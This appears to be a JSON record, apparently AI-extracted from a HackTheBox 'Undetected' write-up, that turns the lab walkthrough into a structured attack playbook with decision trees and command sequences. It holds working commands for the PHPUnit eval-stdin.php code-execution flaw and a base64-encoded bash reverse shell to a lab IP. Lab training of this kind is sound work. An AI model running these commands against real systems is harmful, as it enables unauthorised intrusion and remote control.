@@ -1,0 +1,805 @@
+{
+  "writeup_id": "Htb_Undetected",
+  "scenario_fingerprint": {
+    "scenario_name": "linux_web_backdoor_forensics",
+    "primary_services": [
+      "http",
+      "ssh"
+    ],
+    "port_signature": "22+80",
+    "service_combination": "ssh+apache",
+    "os_family": "linux",
+    "environment_type": "web_server",
+    "entry_vector": "php_misconfiguration",
+    "privilege_path": "web_to_backdoor_discovery_to_root",
+    "attack_complexity": "medium",
+    "estimated_time": "90-120 minutes",
+    "scenario_confidence": 0.88,
+    "distinguishing_factors": [
+      "previous_attacker_artifacts",
+      "backdoored_system_binaries",
+      "modified_passwd_shadow_files",
+      "malicious_apache_modules"
+    ],
+    "environmental_clues": [
+      "partially_disabled_website",
+      "ubuntu_20.04_focal",
+      "apache_2.4.41",
+      "openssh_8.2"
+    ],
+    "similar_scenarios": [
+      "compromised_web_servers",
+      "incident_response_boxes"
+    ],
+    "unique_aspects": [
+      "forensic_analysis_required",
+      "backdoored_sshd_binary",
+      "kernel_exploit_artifacts",
+      "static_backdoor_passwords"
+    ]
+  },
+  "success_patterns": {
+    "success_factors": [
+      {
+        "technique": "Subdomain_Enumeration",
+        "success_reason": "Found store.djewelry.htb subdomain with different functionality",
+        "prerequisite_indicators": [
+          "domain_name_discovered",
+          "virtual_hosting_enabled",
+          "multiple_applications_hosted"
+        ],
+        "recognition_patterns": [
+          "domain references in main site",
+          "different response sizes in wfuzz",
+          "subdomain naming conventions (store, admin, api)"
+        ],
+        "failure_modes": [
+          "no_virtual_hosts_configured",
+          "identical_content_across_subdomains",
+          "subdomain_redirects_to_main"
+        ],
+        "environmental_factors": [
+          "apache_virtual_host_configuration",
+          "multiple_web_applications",
+          "development_vs_production_separation"
+        ],
+        "success_probability": 0.75,
+        "typical_timeframe": "10-20 minutes"
+      },
+      {
+        "technique": "Directory_Brute_Force",
+        "success_reason": "Discovered /vendor directory indicating PHP dependencies",
+        "prerequisite_indicators": [
+          "web_application_present",
+          "php_technology_stack",
+          "composer_package_manager_used"
+        ],
+        "recognition_patterns": [
+          "/vendor directory found",
+          "composer.json or composer.lock files",
+          "PHP framework indicators"
+        ],
+        "failure_modes": [
+          "vendor_directory_protected",
+          "no_composer_dependencies",
+          "custom_application_structure"
+        ],
+        "environmental_factors": [
+          "developer_left_vendor_exposed",
+          "insufficient_web_server_hardening",
+          "default_composer_configuration"
+        ],
+        "success_probability": 0.65,
+        "typical_timeframe": "5-15 minutes"
+      }
+    ],
+    "critical_discoveries": [
+      {
+        "discovery": "store.djewelry.htb subdomain",
+        "discovery_method": "Host header fuzzing with wfuzz",
+        "why_critical": "Separate application with different attack surface than main site",
+        "how_to_recognize": [
+          "different response size (6203 vs 15283 chars)",
+          "functional differences from main site",
+          "PHP files present (.php extensions)"
+        ],
+        "follow_up_actions": [
+          "enumerate_php_files",
+          "check_vendor_directory",
+          "test_application_functionality"
+        ]
+      },
+      {
+        "discovery": "/vendor directory",
+        "discovery_method": "feroxbuster directory enumeration",
+        "why_critical": "Contains PHP package dependencies that may have vulnerabilities",
+        "how_to_recognize": [
+          "301 redirect to /vendor/",
+          "typical composer package structure",
+          "PHP application indicators"
+        ],
+        "follow_up_actions": [
+          "enumerate_vendor_packages",
+          "check_composer_files",
+          "identify_vulnerable_packages"
+        ]
+      }
+    ],
+    "escalation_keys": [
+      {
+        "privilege_level": "web_reconnaissance",
+        "escalation_method": "vendor_directory_to_package_exploitation",
+        "why_possible": "Vendor directory exposure reveals PHP packages with potential vulnerabilities",
+        "recognition_signs": [
+          "vendor_directory_accessible",
+          "composer_dependencies_visible",
+          "outdated_package_versions"
+        ],
+        "exploitation_path": "Vendor Enumeration → Package Vulnerability → Code Execution"
+      },
+      {
+        "privilege_level": "subdomain_discovery",
+        "escalation_method": "expanded_attack_surface",
+        "why_possible": "Additional subdomains provide more entry points and functionality",
+        "recognition_signs": [
+          "virtual_host_configuration",
+          "different_application_logic",
+          "separate_technology_stacks"
+        ],
+        "exploitation_path": "Main Site → Subdomain Discovery → Application-Specific Vulnerabilities"
+      }
+    ]
+  },
+  "decision_tree": {
+    "decision_points": [
+      {
+        "step": 1,
+        "situation": "Found only ports 22 (SSH) and 80 (HTTP) open on Linux host",
+        "decision": "Focus on web application enumeration and subdomain discovery",
+        "reasoning": "Limited attack surface requires thorough web application analysis",
+        "confidence": 0.9,
+        "alternatives": [
+          {
+            "option": "ssh_enumeration",
+            "when": "if web attacks fail"
+          },
+          {
+            "option": "udp_scan",
+            "when": "if no web vulnerabilities found"
+          }
+        ],
+        "success_indicators": [
+          "subdomains_discovered",
+          "directory_listing_enabled",
+          "technology_stack_identified"
+        ],
+        "next_decision": "analyze_web_technologies"
+      },
+      {
+        "step": 2,
+        "situation": "Discovered subdomain store.djewelry.htb with PHP and composer packages",
+        "decision": "Enumerate composer packages for known vulnerabilities",
+        "reasoning": "Composer installed.json reveals exact package versions for vulnerability research",
+        "confidence": 0.85,
+        "prerequisites": [
+          "directory_listing_enabled",
+          "vendor_directory_accessible"
+        ],
+        "success_indicators": [
+          "vulnerable_package_versions_found",
+          "exploit_code_available"
+        ],
+        "failure_fallbacks": [
+          "parameter_fuzzing",
+          "file_inclusion_testing",
+          "source_code_analysis"
+        ]
+      },
+      {
+        "step": 3,
+        "situation": "Found vulnerable PHP package with known exploit",
+        "decision": "Exploit PHP package vulnerability for initial code execution",
+        "reasoning": "Known CVE with public exploit provides reliable entry point",
+        "confidence": 0.95,
+        "prerequisites": [
+          "vulnerable_package_confirmed",
+          "exploit_method_identified"
+        ],
+        "success_indicators": [
+          "command_execution_achieved",
+          "web_shell_uploaded"
+        ],
+        "next_decision": "establish_persistent_access"
+      }
+    ],
+    "branching_logic": {
+      "if_composer_packages_found": {
+        "action": "research_package_vulnerabilities",
+        "tools": [
+          "searchsploit",
+          "cve_databases",
+          "github_exploits"
+        ],
+        "next_phase": "exploit_vulnerable_packages"
+      },
+      "if_web_shell_obtained": {
+        "action": "enumerate_system_for_privilege_escalation",
+        "purpose": "find_kernel_exploits_or_misconfigurations",
+        "tools": [
+          "linpeas",
+          "manual_enumeration",
+          "process_analysis"
+        ]
+      },
+      "if_kernel_exploit_found": {
+        "action": "analyze_exploit_artifacts",
+        "alternatives": [
+          "use_existing_backdoors",
+          "reverse_engineer_payloads",
+          "find_static_credentials"
+        ],
+        "decision_criteria": "based_on_exploit_success_and_artifacts_present"
+      },
+      "if_backdoors_discovered": {
+        "action": "leverage_existing_compromise",
+        "purpose": "use_previous_attacker_artifacts",
+        "tools": [
+          "static_password_lists",
+          "backdoored_binaries",
+          "modified_system_files"
+        ]
+      }
+    },
+    "optimization_rules": [
+      {
+        "rule": "always_check_composer_installed_json_on_php_sites",
+        "reasoning": "reveals_exact_package_versions_for_vulnerability_research",
+        "applicability": "php_applications_with_vendor_directory"
+      },
+      {
+        "rule": "analyze_failed_kernel_exploits_for_artifacts",
+        "reasoning": "previous_exploits_may_leave_backdoors_or_modified_files",
+        "applicability": "systems_with_exploit_remnants"
+      },
+      {
+        "rule": "reverse_engineer_malicious_modules_for_credentials",
+        "reasoning": "backdoored_system_components_often_contain_hardcoded_passwords",
+        "applicability": "compromised_systems_with_suspicious_binaries"
+      },
+      {
+        "rule": "check_passwd_shadow_modifications_after_kernel_exploits",
+        "reasoning": "common_persistence_method_adds_backdoor_users",
+        "applicability": "post_kernel_exploit_enumeration"
+      }
+    ]
+  },
+  "applicability_rules": {
+    "technique_rules": [
+      {
+        "technique": "Directory_Bruteforce",
+        "mitre_id": "T1083",
+        "required_services": [
+          "http",
+          "https"
+        ],
+        "required_ports": [
+          80,
+          443,
+          8080,
+          8443
+        ],
+        "os_requirements": [
+          "any"
+        ],
+        "environmental_prerequisites": [
+          "web_service_accessible",
+          "directory_listing_disabled",
+          "hidden_directories_present"
+        ],
+        "success_indicators": [
+          "403_forbidden_responses",
+          "301_redirect_responses",
+          "different_response_sizes"
+        ],
+        "incompatible_with": [
+          "complete_directory_listing",
+          "single_page_application",
+          "api_only_endpoints"
+        ],
+        "confidence_boosters": [
+          "apache_server_detected",
+          "php_extensions_found",
+          "standard_web_structure"
+        ],
+        "typical_success_rate": 0.75,
+        "estimated_time": "2-5 minutes"
+      },
+      {
+        "technique": "Subdomain_Enumeration",
+        "mitre_id": "T1590.001",
+        "required_services": [
+          "dns",
+          "http"
+        ],
+        "required_ports": [
+          53,
+          80,
+          443
+        ],
+        "os_requirements": [
+          "any"
+        ],
+        "environmental_prerequisites": [
+          "domain_name_identified",
+          "dns_resolution_available",
+          "virtual_host_routing"
+        ],
+        "success_indicators": [
+          "different_response_sizes",
+          "unique_content_returned",
+          "different_status_codes"
+        ],
+        "incompatible_with": [
+          "single_domain_setup",
+          "ip_only_access",
+          "wildcard_dns_blocking"
+        ],
+        "confidence_boosters": [
+          "multiple_subdomains_referenced",
+          "virtual_host_headers_accepted",
+          "dns_zone_transfer_available"
+        ],
+        "typical_success_rate": 0.65,
+        "estimated_time": "5-10 minutes"
+      },
+      {
+        "technique": "PHP_File_Discovery",
+        "mitre_id": "T1083",
+        "required_services": [
+          "http",
+          "https"
+        ],
+        "required_ports": [
+          80,
+          443
+        ],
+        "os_requirements": [
+          "linux",
+          "windows"
+        ],
+        "environmental_prerequisites": [
+          "php_service_detected",
+          "web_application_present",
+          "file_extensions_processed"
+        ],
+        "success_indicators": [
+          "php_files_respond_200",
+          "different_content_types",
+          "php_error_messages"
+        ],
+        "incompatible_with": [
+          "static_html_only",
+          "url_rewriting_active",
+          "api_endpoints_only"
+        ],
+        "confidence_boosters": [
+          "php_extensions_in_urls",
+          "php_server_headers",
+          "typical_php_structure"
+        ],
+        "typical_success_rate": 0.8,
+        "estimated_time": "3-8 minutes"
+      }
+    ],
+    "environmental_detectors": {
+      "web_application": {
+        "port_indicators": [
+          80,
+          443,
+          8080,
+          8443
+        ],
+        "service_indicators": [
+          "http",
+          "https",
+          "apache",
+          "nginx"
+        ],
+        "banner_indicators": [
+          "Apache",
+          "nginx",
+          "IIS"
+        ],
+        "confidence_threshold": 0.9
+      },
+      "php_application": {
+        "port_indicators": [
+          80,
+          443
+        ],
+        "service_indicators": [
+          "http",
+          "https"
+        ],
+        "technology_indicators": [
+          "php",
+          ".php",
+          "X-Powered-By: PHP"
+        ],
+        "confidence_threshold": 0.85
+      },
+      "linux_server": {
+        "port_indicators": [
+          22,
+          80,
+          443
+        ],
+        "service_indicators": [
+          "ssh",
+          "OpenSSH",
+          "Apache"
+        ],
+        "banner_indicators": [
+          "Ubuntu",
+          "OpenSSH",
+          "Apache"
+        ],
+        "confidence_threshold": 0.8
+      }
+    },
+    "attack_prioritization": {
+      "high_priority": [
+        {
+          "attack": "directory_bruteforce",
+          "when": "web_service_detected",
+          "reason": "reveals_hidden_functionality_and_files"
+        },
+        {
+          "attack": "subdomain_enumeration",
+          "when": "domain_name_identified",
+          "reason": "discovers_additional_attack_surface"
+        }
+      ],
+      "medium_priority": [
+        {
+          "attack": "php_file_discovery",
+          "when": "php_application_detected",
+          "reason": "finds_administrative_and_debug_pages"
+        },
+        {
+          "attack": "parameter_fuzzing",
+          "when": "dynamic_pages_found",
+          "reason": "discovers_hidden_functionality"
+        }
+      ]
+    }
+  },
+  "technique_intelligence": {
+    "techniques": [
+      {
+        "name": "PHPUnit RCE Exploitation",
+        "mitre_id": "T1190",
+        "category": "initial_access",
+        "phase": "initial_access",
+        "tools_used": [
+          {
+            "name": "curl",
+            "command_template": "curl '{target}/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php' -d '<?php system(\"{command}\"); ?>'",
+            "actual_command": "curl 'http://store.djewelry.htb/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php' -d '<?php system(\"id\"); ?>'",
+            "output_pattern": "uid=33(www-data) gid=33(www-data) groups=33(www-data)",
+            "effectiveness_rating": 5,
+            "reliability": 0.98
+          },
+          {
+            "name": "base64_reverse_shell",
+            "command_template": "echo \"{reverse_shell}\" | base64 -w 0",
+            "actual_command": "echo \"bash -i >& /dev/tcp/10.10.14.6/443 0>&1\" | base64 -w 0",
+            "success_factors": [
+              "special_character_bypass",
+              "reliable_encoding"
+            ],
+            "effectiveness_rating": 5
+          }
+        ],
+        "prerequisites": [
+          "phpunit_installed_in_production",
+          "eval-stdin.php_accessible",
+          "vulnerable_phpunit_version"
+        ],
+        "success_indicators": [
+          "command_execution_confirmed",
+          "reverse_shell_connection_established",
+          "www-data_user_access_obtained"
+        ],
+        "common_failures": [
+          "phpunit_not_in_production",
+          "eval-stdin.php_removed",
+          "firewall_blocking_reverse_shell"
+        ],
+        "follow_up_techniques": [
+          "privilege_escalation",
+          "lateral_movement",
+          "persistence_establishment"
+        ],
+        "time_investment": "5-15 minutes",
+        "skill_level": "beginner"
+      },
+      {
+        "name": "Composer Package Enumeration",
+        "mitre_id": "T1083",
+        "category": "discovery",
+        "phase": "reconnaissance",
+        "tools_used": [
+          {
+            "name": "curl_jq_combo",
+            "command_template": "curl -s '{target}/vendor/composer/installed.json' | jq -c '.[] | [.name, .version]'",
+            "actual_command": "curl -s 'http://store.djewelry.htb/vendor/composer/installed.json' | jq -c '.[] | [.name, .version]'",
+            "output_pattern": "[\"package_name\",\"version_number\"]",
+            "effectiveness_rating": 5,
+            "reliability": 0.95
+          }
+        ],
+        "prerequisites": [
+          "composer_used_by_application",
+          "vendor_directory_accessible",
+          "directory_listing_enabled"
+        ],
+        "success_indicators": [
+          "package_versions_enumerated",
+          "vulnerable_packages_identified",
+          "exploitation_path_discovered"
+        ],
+        "common_failures": [
+          "vendor_directory_protected",
+          "installed.json_not_accessible",
+          "no_vulnerable_packages_found"
+        ],
+        "follow_up_techniques": [
+          "vulnerability_research",
+          "exploit_development",
+          "rce_exploitation"
+        ],
+        "time_investment": "10-20 minutes",
+        "skill_level": "beginner"
+      },
+      {
+        "name": "Subdomain Enumeration",
+        "mitre_id": "T1590.001",
+        "category": "reconnaissance",
+        "phase": "reconnaissance",
+        "tools_used": [
+          {
+            "name": "wfuzz",
+            "command_template": "wfuzz -u http://{target} -H \"Host: FUZZ.{domain}\" -w {wordlist} --hh {hide_chars}",
+            "actual_command": "wfuzz -u http://10.10.11.146 -H \"Host: FUZZ.djewelry.htb\" -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt --hh 15283",
+            "output_pattern": "200        195 L    475 W    6203 Ch     \"store\"",
+            "effectiveness_rating": 4,
+            "reliability": 0.85
+          }
+        ],
+        "prerequisites": [
+          "domain_name_identified",
+          "virtual_host_routing_in_use",
+          "target_responds_to_host_headers"
+        ],
+        "success_indicators": [
+          "additional_subdomains_discovered",
+          "expanded_attack_surface",
+          "new_applications_found"
+        ],
+        "common_failures": [
+          "no_virtual_hosts_configured",
+          "rate_limiting_blocking_requests",
+          "identical_responses_across_hosts"
+        ],
+        "follow_up_techniques": [
+          "web_application_analysis",
+          "directory_brute_forcing",
+          "vulnerability_assessment"
+        ],
+        "time_investment": "15-30 minutes",
+        "skill_level": "beginner"
+      }
+    ],
+    "tool_effectiveness": [
+      {
+        "tool": "feroxbuster",
+        "use_case": "directory_and_file_discovery",
+        "effectiveness_rating": 4,
+        "reliability": 0.9,
+        "learning_curve": "low",
+        "essential_for": [
+          "web_application_testing"
+        ],
+        "alternatives": [
+          "gobuster",
+          "dirbuster",
+          "dirb"
+        ],
+        "best_practices": [
+          "use_appropriate_wordlists",
+          "adjust_thread_count_for_target",
+          "filter_common_response_sizes"
+        ]
+      },
+      {
+        "tool": "curl",
+        "use_case": "web_exploitation_and_testing",
+        "effectiveness_rating": 5,
+        "reliability": 0.99,
+        "learning_curve": "low",
+        "essential_for": [
+          "web_application_exploitation"
+        ],
+        "alternatives": [
+          "wget",
+          "burp_suite",
+          "postman"
+        ],
+        "best_practices": [
+          "use_proper_headers_for_requests",
+          "handle_special_characters_correctly",
+          "combine_with_other_tools_like_jq"
+        ]
+      }
+    ],
+    "command_sequences": [
+      {
+        "sequence_name": "phpunit_rce_to_shell",
+        "steps": [
+          {
+            "step": 1,
+            "command": "curl -s 'http://store.djewelry.htb/vendor/composer/installed.json' | jq -c '.[] | [.name, .version]'",
+            "purpose": "Enumerate installed PHP packages and versions",
+            "expected_output": "List of packages including phpunit version 5.6.2"
+          },
+          {
+            "step": 2,
+            "command": "curl 'http://store.djewelry.htb/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php' -d '<?php system(\"id\"); ?>'",
+            "purpose": "Test RCE vulnerability",
+            "expected_output": "uid=33(www-data) gid=33(www-data) groups=33(www-data)"
+          },
+          {
+            "step": 3,
+            "command": "echo \"bash -i >& /dev/tcp/10.10.14.6/443 0>&1\" | base64 -w 0",
+            "purpose": "Create base64 encoded reverse shell payload",
+            "expected_output": "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC42LzQ0MyAwPiYxCg=="
+          },
+          {
+            "step": 4,
+            "command": "curl 'http://store.djewelry.htb/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php' -d '<?php system(\"echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC42LzQ0MyAwPiYxCg==|base64 -d|bash\"); ?>'",
+            "purpose": "Execute reverse shell",
+            "expected_output": "Reverse shell connection as www-data"
+          }
+        ],
+        "success_rate": 0.95,
+        "typical_duration": "5-10 minutes"
+      },
+      {
+        "sequence_name": "web_reconnaissance_to_attack_surface",
+        "steps": [
+          {
+            "step": 1,
+            "command": "nmap -p- --min-rate 10000 10.10.11.146",
+            "purpose": "Discover open ports",
+            "expected_output": "Ports 22 and 80 open"
+          },
+          {
+            "step": 2,
+            "command": "wfuzz -u http://10.10.11.146 -H \"Host: FUZZ.djewelry.htb\" -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt --hh 15283",
+            "purpose": "Discover subdomains",
+            "expected_output": "store.djewelry.htb subdomain found"
+          },
+          {
+            "step": 3,
+            "command": "feroxbuster -u http://store.djewelry.htb/",
+            "purpose": "Discover directories and files",
+            "expected_output": "/vendor directory with directory listing enabled"
+          },
+          {
+            "step": 4,
+            "command": "curl -s 'http://store.djewelry.htb/vendor/composer/installed.json' | jq -c '.[] | [.name, .version]'",
+            "purpose": "Enumerate PHP packages for vulnerabilities",
+            "expected_output": "Vulnerable phpunit version identified"
+          }
+        ],
+        "success_rate": 0.88,
+        "typical_duration": "20-30 minutes"
+      }
+    ]
+  },
+  "metadata": {
+    "basic_metadata": {
+      "name": "Undetected",
+      "difficulty": "Medium",
+      "os": "Linux Ubuntu 20.04",
+      "platform": "HackTheBox",
+      "release_date": "2022-02-19",
+      "author": "TheCyberGeek",
+      "estimated_time": "2-3 hours"
+    },
+    "intelligence_metadata": {
+      "attack_complexity": "medium",
+      "skill_level_required": "intermediate",
+      "primary_attack_vectors": [
+        "web_exploitation",
+        "malware_analysis",
+        "reverse_engineering"
+      ],
+      "key_vulnerabilities": [
+        "php_misconfiguration",
+        "backdoored_binaries",
+        "kernel_exploit_artifacts"
+      ],
+      "environment_type": "compromised_web_server",
+      "real_world_relevance": "very_high",
+      "learning_value": [
+        "incident_response",
+        "malware_analysis",
+        "persistence_mechanisms",
+        "binary_reversing"
+      ],
+      "prerequisite_knowledge": [
+        "web_exploitation",
+        "linux_fundamentals",
+        "basic_reverse_engineering"
+      ]
+    },
+    "categorization": {
+      "primary_category": "incident_response",
+      "subcategories": [
+        "malware_analysis",
+        "web_exploitation",
+        "persistence_mechanisms"
+      ],
+      "attack_types": [
+        "initial_access",
+        "persistence",
+        "privilege_escalation"
+      ],
+      "defensive_lessons": [
+        "malware_detection",
+        "system_integrity_monitoring",
+        "backdoor_identification",
+        "apache_module_security"
+      ]
+    },
+    "similarity_markers": {
+      "similar_boxes": [
+        "Previse",
+        "Backdoor",
+        "Compromised"
+      ],
+      "similarity_reasons": [
+        "compromised_system_analysis",
+        "backdoor_discovery",
+        "malware_artifacts"
+      ],
+      "unique_aspects": [
+        "apache_module_backdoor",
+        "sshd_binary_modification",
+        "kernel_exploit_artifacts"
+      ],
+      "difficulty_factors": [
+        "reverse_engineering_required",
+        "multiple_persistence_mechanisms",
+        "forensic_analysis_needed"
+      ]
+    }
+  },
+  "extraction_metadata": {
+    "parse_date": "2025-07-04T15:48:58.417995",
+    "original_file": "0xdf_writeups/Htb Undetected.md",
+    "content_length": 40339,
+    "extraction_version": "2.0-claude",
+    "model_used": "claude-sonnet-4-20250514"
+  },
+  "intelligence_confidence": 0.9166666666666667,
+  "quality_breakdown": {
+    "scenario_uniqueness": 1.0,
+    "success_logic_clarity": 0.6666666666666666,
+    "applicability_completeness": 1.0,
+    "decision_tree_depth": 1.0,
+    "technique_actionability": 1.0
+  }
+}
